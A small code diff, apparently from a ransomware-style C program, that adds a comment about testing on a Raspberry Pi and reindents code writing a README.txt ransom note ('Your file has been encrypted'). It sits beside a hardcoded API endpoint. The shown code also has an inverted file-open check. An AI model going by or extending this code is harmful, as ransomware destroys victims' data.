@@ -11,6 +11,8 @@
 #include <stdlib.h>
 
 // Replace with your own API endpoint.
+// Tested on Rasbbery pi on my IoT Projects 
+
 #define API_ENDPOINT "http://192.168.8.103/api.php"
 
 struct hw_info {
@@ -552,14 +554,14 @@ int main(int argc, char *argv[])
         file = fopen ("README.txt", "w");
 
     	  if (!file)
-        {
+          {
     		  printf("File has been created\n");
     	  }
 
     	  else
-        {
-          fputs("Your file has been encrypted", file);
-          fclose(file);
+          {
+              fputs("Your file has been encrypted", file);
+              fclose(file);
     	  }
       }
 
